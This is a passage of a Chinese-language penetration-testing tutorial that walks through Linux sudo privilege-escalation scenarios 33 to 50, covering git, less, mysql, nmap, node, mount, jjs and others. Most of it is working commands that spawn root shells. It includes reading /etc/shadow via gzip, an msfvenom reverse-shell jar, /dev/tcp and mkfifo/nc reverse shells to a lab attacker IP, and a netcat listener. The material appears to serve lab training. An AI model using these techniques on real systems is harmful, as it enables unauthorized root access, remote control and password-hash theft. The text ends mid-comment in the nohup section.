![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685612610656-d6ad5fed-aae9-410c-841c-4016637bb234.png#averageHue=%23272936&clientId=ucada80b3-aeb4-4&from=paste&height=521&id=ua364ccfa&originHeight=651&originWidth=706&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=451047&status=done&style=none&taskId=u47120ed6-ca08-4973-bc28-6babd3b99e2&title=&width=564.8)
## 情景三十三 - git
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685630869314-eb998aaf-af96-444f-9ccf-90f057e70dbb.png#averageHue=%23282a36&clientId=u5826a877-a3c8-4&from=paste&height=54&id=u8075d647&originHeight=67&originWidth=466&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30407&status=done&style=none&taskId=u4308ef60-b213-4fde-b565-c390bbd5568&title=&width=372.8)
```bash
sudo git clone --help 
# 输入任何 git 命令选项的帮助，会跳入 less 模式帮助页面

!/bin/bash
# ! 说明指定操作系统自身的命令。
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685631371214-8d3ce4db-58cc-44b1-a4d2-fd058887c815.png#averageHue=%231b1d29&clientId=u5826a877-a3c8-4&from=paste&height=122&id=u9f8905cc&originHeight=152&originWidth=396&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=33666&status=done&style=none&taskId=u939cd600-51a5-4903-9e60-3153294ad8f&title=&width=316.8)
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685631389040-62439f56-bf91-4b93-aaac-25e8da72bbb6.png#averageHue=%2322242f&clientId=u5826a877-a3c8-4&from=paste&height=168&id=ud43e7d60&originHeight=210&originWidth=541&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=95944&status=done&style=none&taskId=u16ed61de-e654-435b-b84a-49e794550a5&title=&width=432.8)
## 情景三十四 - gzip/gunzip
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685608751656-11678752-e3c8-4d46-86bb-e190b64ba2d5.png#averageHue=%23616267&clientId=ucada80b3-aeb4-4&from=paste&height=54&id=u8bc42cc0&originHeight=67&originWidth=392&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12057&status=done&style=none&taskId=ufc114d08-b8c2-4eae-b2a0-917afaf2fdb&title=&width=313.6)
**gzip** 强制读取 **/etc/shadow** 文件 并显示出来，泄露 **root **密码
```bash
sudo gzip  -f /etc/shadow -t

# -f force 强制读取

# -t 读取检查 压缩文件，将内容显示出来
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685610914880-718ff4fc-a0f6-4356-9226-f30e41563bf3.png#averageHue=%2333353e&clientId=ucada80b3-aeb4-4&from=paste&height=286&id=u7402aac0&originHeight=357&originWidth=955&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=100607&status=done&style=none&taskId=ua2168e20-c9a9-4b8a-aaf2-6e89da35cf1&title=&width=764)
## 情景三十五 - hping3
一款强大的 网络工具
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685636139974-ea09b910-cad8-445f-a7db-4dfe5b6b7490.png#averageHue=%232c3443&clientId=u5826a877-a3c8-4&from=paste&height=46&id=u4f8fe0db&originHeight=57&originWidth=521&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30948&status=done&style=none&taskId=u846111d5-38dc-4116-ae93-53a27daaded&title=&width=416.8)
```bash
sudo /usr/sbin/hping3  # 进入交互式界面

/bin/bash # 交互式界面 开启 shell
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685636493116-116e2753-6ea0-4209-b12e-6a8a71ed0831.png#averageHue=%23232632&clientId=u5826a877-a3c8-4&from=paste&height=246&id=ub3c1f894&originHeight=308&originWidth=450&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=118201&status=done&style=none&taskId=u5ea4c3fc-7452-4973-9230-5557ba9f924&title=&width=360)
## 情景三十六 - iftop
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685599785299-0a620ab0-a090-4368-be68-9dfc8a275f34.png#averageHue=%232b354a&clientId=ucada80b3-aeb4-4&from=paste&height=65&id=ua30653a7&originHeight=81&originWidth=510&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=46224&status=done&style=none&taskId=uf08a3bd6-6809-48c1-bb88-d381d02065b&title=&width=408)
```bash
sudo iftop

!/bin/bash
# ! 说明指定操作系统自身的命令，而不是ftp命令
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685608615064-cbaa348a-b623-4f4f-ac87-6bb8d44fd0ba.png#averageHue=%2320242e&clientId=ucada80b3-aeb4-4&from=paste&height=197&id=uf6b698ff&originHeight=246&originWidth=1016&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=70670&status=done&style=none&taskId=u37b1a9b8-f746-40c3-862e-fe3741be08f&title=&width=812.8)
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685608637957-b8206bb3-4ea1-4b9c-838e-a8c60e2598c2.png#averageHue=%235e5f65&clientId=ucada80b3-aeb4-4&from=paste&height=228&id=u58e6a8aa&originHeight=285&originWidth=469&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54975&status=done&style=none&taskId=u7ceca483-d2a0-4b23-b3d8-3266cce839e&title=&width=375.2)
## 情景三十七 - java
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685630894520-39e8dd18-0712-48e9-bafe-4ee19169f7a8.png#averageHue=%23282a36&clientId=u5826a877-a3c8-4&from=paste&height=46&id=u87426608&originHeight=58&originWidth=430&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24099&status=done&style=none&taskId=u3ce5161e-61ec-4903-9998-99d076995fa&title=&width=344)
**msfvenom **生成反弹**shell** jar 包
```bash
msfvenom -p java/shell_reverse_tcp LHOST=192.168.65.130 LPORT=4444 -f jar -o exploit.jar
```
```bash
sudo java -jar exploit.jar
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685638534549-9f104033-6b7b-4bdf-9496-d5f2bfccdee1.png#averageHue=%23242737&clientId=uae37237f-8e18-4&from=paste&height=351&id=u51710aa2&originHeight=439&originWidth=1278&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=450502&status=done&style=none&taskId=uf2c2ca97-b39d-4814-93d2-0de698ddc1d&title=&width=1022.4)
## 情景三十八 - jjs
JavaScript的jjs（Java JavaScript Shell）工具
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686118251334-1b7e6396-e46b-4f48-bd99-d824978f15a5.png#averageHue=%232b2e3b&clientId=u130ca417-5f81-4&from=paste&height=45&id=u49996f50&originHeight=56&originWidth=522&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31894&status=done&style=none&taskId=u2a103400-2431-4168-93fe-98efa341e65&title=&width=417.6)
```bash
echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c
\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | sudo jjs

# /bin/sh -c \$@  - $@ bash 脚本中接收用户输入所有位置参数的值，意思是接受用户输入的字符串并执行
# $(tty)，它会被解析为当前终端的设备文件路径
#  <$(tty) 输入重定向到终端，>$(tty) 输出重定向到终端，2>$(tty) 错误信息重定向到终端
# sh _  _ 占位符,它使用Shell解释器执行未指定的命令
```
shell 卡死了
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686120164145-9d57eeea-c038-4139-92a3-75f8620ad43c.png#averageHue=%23202232&clientId=u2c2d2fa2-97a5-4&from=paste&height=159&id=ua390b748&originHeight=199&originWidth=1837&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=259647&status=done&style=none&taskId=u560d8b55-518e-4ac3-ac0d-a91bf0a485d&title=&width=1469.6)
[https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
```java
r = Runtime.getRuntime()
    
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.65.130/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    
p.waitFor()
```
```bash
echo "Java.type('java.lang.Runtime').getRuntime().exec(['/bin/bash','-
c','exec 5<>/dev/tcp/192.168.65.130/4444;cat <&5 | while read line; do
\$line 2>&5 >&5; done']).waitFor()" | sudo jjs
```
> `**"Java.type('java.lang.Runtime').getRuntime().exec([...]).waitFor()" **`：是一段**JavaScript **代码，通过jjs执行。它使用Java的Runtime类来执行一些操作。
> `**Java.type('java.lang.Runtime')**`: 是JavaScript代码的一部分，用于获取Java中Runtime类的引用。 
> `**.exec([...])**` ：通过Runtime对象的exec方法，执行一个命令或进程。
> `**exec 5<>/dev/tcp/10.10.10.10/9595;cat <&5 | while read line; do \$line 2>&5>&5; done**`：这是要执行的Bash命令。它的功能是将计算机与IP地址为10.10.10.10、端口为9595的主机建立一个双向的网络连接。然后，它使用 cat 命令将来自该连接的数据传递给一个 while 循环，循环中执行每一行数据作为命令，并将输出和错误重定向回连接。
> `**5<>**`** **：指定文件描述符为 5
> `**.waitFor()**` ：等待执行的进程完成。
> `**| sudo jjs**` ：将前面的命令通过管道传递给sudo jjs命令，以使用超级用户权限运行 **jjs** 工具。

```bash
sudo rlwrap nc -lvnp 4444
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686120535654-87a3e160-4cbb-426e-a77f-b578348624fa.png#averageHue=%23242735&clientId=u2c2d2fa2-97a5-4&from=paste&height=139&id=u94673496&originHeight=174&originWidth=1069&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=174417&status=done&style=none&taskId=uaa316581-e026-4c8f-8e3a-86bb91414b4&title=&width=855.2)
连接成功！！！，获得 **root **权限，但 **shell** 的交互性有待提升。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686120636782-89d301b8-9870-4d63-884e-1f6d9ee8f7e6.png#averageHue=%231f222f&clientId=u2c2d2fa2-97a5-4&from=paste&height=218&id=u74d1e7ba&originHeight=272&originWidth=508&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=99972&status=done&style=none&taskId=u95ac7a63-aafa-4a27-8f58-5721185c387&title=&width=406.4)
发现，靶机即使装了python ，但也没法通过以下语句提权
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686120793881-4568eec6-9c63-47e7-97e2-6c7dbe4fc5b6.png#averageHue=%231f212e&clientId=u2c2d2fa2-97a5-4&from=paste&height=179&id=u4ad5053f&originHeight=224&originWidth=829&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=120800&status=done&style=none&taskId=u9932c507-ba8d-4553-8ec6-37502fa6455&title=&width=663.2)
其实新建一个反弹shell就可以。
```bash
rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.65.130 6666 > /tmp/f
```
报了这样一个错，按道理，在正常的 shell 下执行该命令不会报错
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686121187388-54d0cb82-d7e7-4ab0-a1fa-d454efe4942c.png#averageHue=%23232635&clientId=u2c2d2fa2-97a5-4&from=paste&height=144&id=ucceeffd8&originHeight=180&originWidth=1263&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=180750&status=done&style=none&taskId=uc1e0b8a9-e6f2-4b7c-a485-12948fce7eb&title=&width=1010.4)
居然没有显示当前的 $SHELL, 解决办法就是执行 `/bin/bash` 进入 bash 环境
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686121383514-9995f97a-329b-46ec-a20f-f7476008a5cf.png#averageHue=%2320232f&clientId=u2c2d2fa2-97a5-4&from=paste&height=62&id=ucbb15fc7&originHeight=78&originWidth=232&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14874&status=done&style=none&taskId=uacd1d376-df6e-4d0c-a8f8-84d41f5a0eb&title=&width=185.6)
显示在 bash 环境下 ( 此时执行python 的 spawn 就可以提升用户交互性 )
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686121516803-0b697597-e410-48aa-8fb1-f02722c73b57.png#averageHue=%2320222e&clientId=u2c2d2fa2-97a5-4&from=paste&height=82&id=u84f80c02&originHeight=103&originWidth=231&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=18873&status=done&style=none&taskId=u7f24f944-7f5a-47ce-b50d-4e630765e86&title=&width=184.8)
再次执行 反弹 shell，发现成功执行，SHELL 的交互性更好了。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686121582342-5462b613-fad1-45fd-a487-ff88179ea208.png#averageHue=%23242735&clientId=u2c2d2fa2-97a5-4&from=paste&height=202&id=ua0cdaa09&originHeight=253&originWidth=923&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=193859&status=done&style=none&taskId=u17d9895f-b6f6-4d87-91f6-29b441c2a69&title=&width=738.4)
## 情景三十九 - journalctl
查询 systemd 日志。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686122810988-f3db66e2-bc0c-4486-adc1-3f75f9802c03.png#averageHue=%232a2f3d&clientId=u11b39549-1d7e-4&from=paste&height=67&id=u51179f37&originHeight=84&originWidth=544&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=53675&status=done&style=none&taskId=ua37d9e04-6af9-479b-9f0b-7f193b4c880&title=&width=435.2)
```bash
sudo journalctl

!/bin/bash # ! 提示执行系统命令
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686123412076-b9bff651-025d-4adf-8ccf-0fa575829ead.png#averageHue=%23222430&clientId=u11b39549-1d7e-4&from=paste&height=113&id=u4c4dfa53&originHeight=141&originWidth=556&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=63435&status=done&style=none&taskId=ub995ca48-c7ba-467f-946d-cbfbe8e752e&title=&width=444.8)
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686123437999-7a4c29d1-beb0-4c2f-966a-3900e5726b3d.png#averageHue=%231e202c&clientId=u11b39549-1d7e-4&from=paste&height=149&id=ud740e403&originHeight=186&originWidth=543&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=70020&status=done&style=none&taskId=ub3464383-0a87-45a7-b848-f30698713d3&title=&width=434.4)
很多新的Linux发行版会禁用`**journalctl**`中的`**!**` 功能，此情形下，这种提权方式就行不 
通了。其提权原理与 `less` 类似
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686122768372-892d8bd5-7755-4e65-b58b-a24566c485a6.png#averageHue=%2384858b&clientId=u11b39549-1d7e-4&from=paste&height=37&id=u8f0e7aee&originHeight=46&originWidth=625&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14624&status=done&style=none&taskId=u884579c0-ee14-465d-a884-c1feef52e69&title=&width=500)
## 情景四十 - knife
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686122810988-f3db66e2-bc0c-4486-adc1-3f75f9802c03.png#averageHue=%232a2f3d&clientId=u11b39549-1d7e-4&from=paste&height=58&id=MeQwu&originHeight=84&originWidth=544&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=53675&status=done&style=none&taskId=ua37d9e04-6af9-479b-9f0b-7f193b4c880&title=&width=378)
**knife** 是 **Chef** 的命令行接口，是 **Chef** 客户端的一个子工具。**Chef** 是一个基于 **Ruby **自动化管理和配置工具，可以用于管理服务器和基础设施。 **knife** 命令可以用于与 **Chef 服务器**进行交互、上传 **配方（recipes）和角色（roles）、管理节点（nodes）**等等。
```bash
sudo knife exec -E "exec '/bin/bash'"

# exec 是一个 knife 子命令，用于在一个或多个节点上执行任意 Ruby 代码。
# -E 选项后面接的字符串是要执行的 Ruby 代码。
# 'exec "/bin/bash"' 执行一个 bash shell。ruby 的语法
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686125319210-bbfd6433-a33d-43d6-83e5-376a211bec55.png#averageHue=%23212432&clientId=u11b39549-1d7e-4&from=paste&height=158&id=u82d9ffbd&originHeight=198&originWidth=1212&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=184720&status=done&style=none&taskId=u764c6f86-50cd-4b0a-8381-822ff78c1ad&title=&width=969.6)
## 情景四十一 - less
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686124997208-dbecf874-30ef-488a-acd1-addcb26c0f8a.png#averageHue=%23242631&clientId=u11b39549-1d7e-4&from=paste&height=38&id=u3684c626&originHeight=48&originWidth=422&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19431&status=done&style=none&taskId=ufb59ea8f-0e7b-4005-8ffb-53e3d64d321&title=&width=337.6)
```bash
sudo less $(mktemp)  # 读取新建的临时文件，防止留下别的痕迹
```
即使文件内容为空，**less** 命令也会进入这种界面
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686125135302-4cfd8a04-af27-42ef-9be6-def77a35562a.png#averageHue=%231c1f2a&clientId=u11b39549-1d7e-4&from=paste&height=104&id=u4b4d9cc9&originHeight=130&originWidth=451&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29378&status=done&style=none&taskId=ud1e85ada-053e-45ec-8a77-ed9483f84ef&title=&width=360.8)
```bash
!/bin/bash
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686125223419-e3373221-fd78-45a3-86d0-2a0845840e8b.png#averageHue=%23242631&clientId=u11b39549-1d7e-4&from=paste&height=162&id=u6e970825&originHeight=202&originWidth=568&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=104001&status=done&style=none&taskId=uf4393ca9-d2bf-4d60-bbf1-4749abd9a04&title=&width=454.4)
## 情景四十二 - more
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686125479871-6515ff2c-0e65-4259-b925-c8283c4677a7.png#averageHue=%23242631&clientId=u11b39549-1d7e-4&from=paste&height=38&id=ufeeca575&originHeight=47&originWidth=412&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=18870&status=done&style=none&taskId=uc7ed2cfe-748d-4871-b0d6-a44a90c2704&title=&width=329.6)
**more** 和 **less** 类似，但有一点不同
```bash
sudo more $(mktemp)
```
空文件时，**more** 不会进入 **less** 界面，无法提权
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686125604472-ea90d9e2-53ec-4b0a-af69-84c47ebed034.png#averageHue=%2320222d&clientId=u11b39549-1d7e-4&from=paste&height=52&id=u73bb4f9e&originHeight=65&originWidth=377&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=20121&status=done&style=none&taskId=ud457f335-598a-4b4a-a387-93b1d858692&title=&width=301.6)
**more **打开的文档需要有一定长度，足以激活 **more**，如上操作中，30条信息未激活 **more**，而是直接显示，50条才激活 **more**。
必要时可以用 `**TERM= sudo more longfile**` ,即将 **TERM **置空，以提高成功率。**但新的发行版还是有很多办法形成对这种利用的阻断。如selinux等不一而足。**
```bash
GTC=$(mktemp)

yes xiaosedi > $GTC
# 向 临时文件 不停的输入 xiaosedi 信息，直到 Ctrl + c 结束输入

sudo more $GTC # 此时会进入 less 界面，即可 提权

!/bin/bash
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686126190845-fac4ca4d-5266-434b-a9d4-cce2ab88a5fe.png#averageHue=%2320222e&clientId=u11b39549-1d7e-4&from=paste&height=209&id=u72e8f7fc&originHeight=261&originWidth=558&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=102335&status=done&style=none&taskId=u10b86b98-de70-4e4f-b47e-e6c857372e2&title=&width=446.4)
## 情景四十三 - man
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686126289347-d5e61f0d-d48a-4f06-b7ac-efaf8bab4dc7.png#averageHue=%23272934&clientId=u11b39549-1d7e-4&from=paste&height=38&id=u7889eb0e&originHeight=48&originWidth=403&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=20300&status=done&style=none&taskId=u9e8d79c6-2972-4f15-b4a1-371ef8b4b34&title=&width=322.4)
```bash
sudo man  [任意 linux 指令] # 进入命令帮助界面
# 即可利用 less 方法提权

!/bin/bash
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686126439692-e51e93cd-4171-467b-9062-2a2b23a17270.png#averageHue=%23252732&clientId=u11b39549-1d7e-4&from=paste&height=150&id=u293a5557&originHeight=187&originWidth=505&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=92483&status=done&style=none&taskId=u23a1c678-e3ae-4049-9eef-08522022db8&title=&width=404)
## 情景四十四 - mysql
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686127283410-7b5f532d-c7f1-49e6-85fc-ee86975c3986.png#averageHue=%23252732&clientId=u11b39549-1d7e-4&from=paste&height=41&id=ub89c77a5&originHeight=51&originWidth=455&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22730&status=done&style=none&taskId=u76b2cbb4-4a62-4110-b6fe-fa2b84199b4&title=&width=364)
```bash
sudo mysql -e '\! /bin/bash'

# -e 参数: 是mysql的参数，执行 SQL 语句 后退出。 
# -e 允许你直接在命令行中直接输入SQL 语句，而不需要打开一个 mysql 交互式会话。

# '\! /bin/bash' 并不是一条SQL命令，而是 mysql 的一个特殊命令。当在 mysql
# 命令提示符后面输入 ! 时，你可以运行一个系统shell命令。

# 为什么使用转义字符 \ ，这是因为 ! 在许多shell中都是一个特殊字符。例如，在
#  bash 中，你可以使用 ! 来执行历史命令。为了确保 ! 字符能正确地传递到
#  mysql ，我们需要使用 \ 对其进行转义，以避免shell尝试对其进行解释。
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686127573137-5cb40191-54c2-48d0-8a9e-4715afe88bea.png#averageHue=%23222531&clientId=u11b39549-1d7e-4&from=paste&height=153&id=u6c6a94fb&originHeight=191&originWidth=702&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=121666&status=done&style=none&taskId=u285ff927-dd1e-4e01-9b21-87cc82934eb&title=&width=561.6)
## 情景四十五 - mount
用于**nfs** 协议的文件挂载
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686128008273-6e8c68ce-4535-4bb3-9391-0cdf1dbe2c06.png#averageHue=%2388898f&clientId=u11b39549-1d7e-4&from=paste&height=46&id=u730cd87b&originHeight=57&originWidth=522&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17203&status=done&style=none&taskId=uef613692-3ea4-430b-9b10-d6f975a3942&title=&width=417.6)
```bash
sudo mount -o bind /bin/bash /usr/bin/mount

# -o bind : 这是 mount 命令的选项之一，表示进行 "绑定挂载"。绑定挂载允许将
#  一个目录或文件挂载到另一个目录上，使得两者内容一致。

# 综上所述，这段代码的作用是将位于 /bin/bash 的Bash shell可执行文件绑定挂载
# 到 /usr/bin/mount 路径上。这样，当执行 mount 命令时，实际上会执行 /bin/bash
# 文件，从而以 Bash shell 环境进行挂载操作。这种做法可能是为了在执行 mount 命令
# 时使用Bash的特性和功能。请注意，这样的操作可能需要具有管理员权限，因此使
# 用了 sudo 命令来获取超级用户权限。

sudo /usr/bin/mount 
# 此时相当于执行 sudo /bin/bash ，提升为 root权限
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686128929190-b52805f4-6e7c-49ef-9cd9-0d490c086e49.png#averageHue=%23222532&clientId=uc8e08173-2447-4&from=paste&height=178&id=ufe3150c7&originHeight=223&originWidth=897&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=171129&status=done&style=none&taskId=u1cbe3e04-2a7c-4102-8c77-5045c2e56df&title=&width=717.6)	
## 情景四十六 - neofetch
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686129487644-a1428029-e142-4c73-a45c-8b866f15c2d3.png#averageHue=%23232531&clientId=uc8e08173-2447-4&from=paste&height=35&id=u81ae7dfa&originHeight=44&originWidth=488&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=18617&status=done&style=none&taskId=uc76ddba9-e729-413a-85b5-30eff190081&title=&width=390.4)
neofetch ：这是一个命令行程序，**用于显示关于你的系统的信息，包括你的操作系统，软件版本，桌面环境，主题，硬件配置等**。它可以通过配置文件进行自定义，以改变输出的信息和格式。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686129653519-0248523e-719c-4494-a334-fe016596d97d.png#averageHue=%23242735&clientId=uc8e08173-2447-4&from=paste&height=344&id=u0e6e1956&originHeight=430&originWidth=976&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=376945&status=done&style=none&taskId=u1e2e11c2-43d0-49d3-85c1-497bd432d38&title=&width=780.8)
```bash
TF=$(mktemp)

echo 'exec /bin/bash' > $TF

sudo neofetch --config $TF
# --config ：这是neofetch的一个选项，它允许你指定一个自定义的配置文件，而不
# 是使用默认的配置文件。
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686130238882-17e58305-4ae5-4130-815d-328f6d99fa56.png#averageHue=%23222430&clientId=uc8e08173-2447-4&from=paste&height=168&id=ue3267412&originHeight=210&originWidth=731&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=132004&status=done&style=none&taskId=u2f5b9a95-36e7-4b61-a5c8-58bb2565b00&title=&width=584.8)
## 情景四十七 - nice
nice ：这个命令用于修改进程的优先级。nice值的范围从**-20（最高优先级）**到**19 （最低优先级）**。默认情况下，**如果不指定数值，nice会设定一个默认值10。**
```bash
sudo nice /bin/bash

# 命令将以root用户的身份启动一个新的bash shell，并且它的
# 优先级将比其他默认进程低（nice值为10）。
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686138379132-62730c5f-8fa7-450d-ad6c-0086a3003f40.png#averageHue=%23232632&clientId=uc8e08173-2447-4&from=paste&height=174&id=u280678ac&originHeight=218&originWidth=597&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=106893&status=done&style=none&taskId=u85f678a5-70fc-4851-b9c9-38f540d8b5c&title=&width=477.6)
## 情景四十八 - nmap
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686139259885-4eb9e892-b5d1-4f84-8e05-a4869476d944.png#averageHue=%23a0a6a6&clientId=uc8e08173-2447-4&from=paste&height=52&id=ud9c96ffb&originHeight=65&originWidth=434&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=21208&status=done&style=none&taskId=u5ecee728-0650-410d-a457-1bd9947c41e&title=&width=347.2)
nmap的**2.02到5.21**版本，可以 `**sudo nmap --interactive**` 启动nmap交互式命令行， 执行 `**!bash**` 实现提权。
```bash
sudo nmap --interactive

nmap> !bash
```
**nmap** 的 **--script** 参数可以运行自定义脚本来提权
```bash
nmap_shell=$(mktemp)

echo 'os.execute("/bin/bash")' > $nmap_shell

sudo nmap --script=$nmap_shell
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686139513026-aef55b5b-803f-48a5-9f4f-2eec08e09ce1.png#averageHue=%23252837&clientId=uc8e08173-2447-4&from=paste&height=412&id=u6b939e25&originHeight=515&originWidth=1187&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=511728&status=done&style=none&taskId=u600c2803-94c6-4d79-9359-b632f8de416&title=&width=949.6)
## 情景四十九 - node
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686140255923-65fc022a-b3f0-4619-afcb-1a8474ebd27a.png#averageHue=%23232531&clientId=uc8e08173-2447-4&from=paste&height=34&id=ub44732ec&originHeight=42&originWidth=420&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13893&status=done&style=none&taskId=ufa5f3ecb-8e42-46aa-96af-41bf9fdaee6&title=&width=336)
**node** 命令用于运行 **Node.js **程序。
```bash
sudo node -e 'require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'

#  -e 选项允许你直接在命令行中运行一段Node.js 代码。

# require("child_process") 调用了Node.js的内置模块 child_process ，该模块提供
# 了创建子进程的能力。

# spawn 方法则是 child_process 模块中的一个函数，可以用来创建新的子进程。
# 它的第一个参数是要运行的命令（在这里是 /bin/bash ，即新的bash shell）
# 第二个参数是一个选项对象。在这个选项对象中， stdio 字段指定了子进程的输入/输出应
# 该如何处理。 [0, 1, 2] 意味着子进程的stdin、stdout和stderr应该连接到父进程相
# 应的流。
```
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686140405567-32f22291-4f12-497d-809a-f122ef22c371.png#averageHue=%23222534&clientId=uc8e08173-2447-4&from=paste&height=213&id=u286165ea&originHeight=266&originWidth=1446&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=303721&status=done&style=none&taskId=u6cacf979-ab0c-446e-80dd-ba519a5f680&title=&width=1156.8)
## 情景五十- nohup
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1686140273899-1ee0d447-5b2d-4cae-a984-5389ccadd2b5.png#averageHue=%23242632&clientId=uc8e08173-2447-4&from=paste&height=31&id=uc475c310&originHeight=39&originWidth=429&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14339&status=done&style=none&taskId=uec514b23-d7e6-49e6-9eca-99d0ba64aa9&title=&width=343.2)
**nohup **: 这个命令的用途是运行一个命令，同时忽略所有挂起**（hangup）信号**。通常情况下，当你关闭终端时，所有由该终端启动的进程都会收到一个 **SIGHUP 信号**，从而结束。但是如果你用 **nohup **启动一个进程，那么即使终端关闭，该进程也会继续运行。
```bash
sudo nohup /bin/bash -c "bash <$(tty) >$(tty) 2>$(tty)"

# bash <$(tty) >$(tty) 2>$(tty) 
# 这里， bash 打开一个新的shell， <$(tty) ，>$(tty) 和 2>$(tty) 
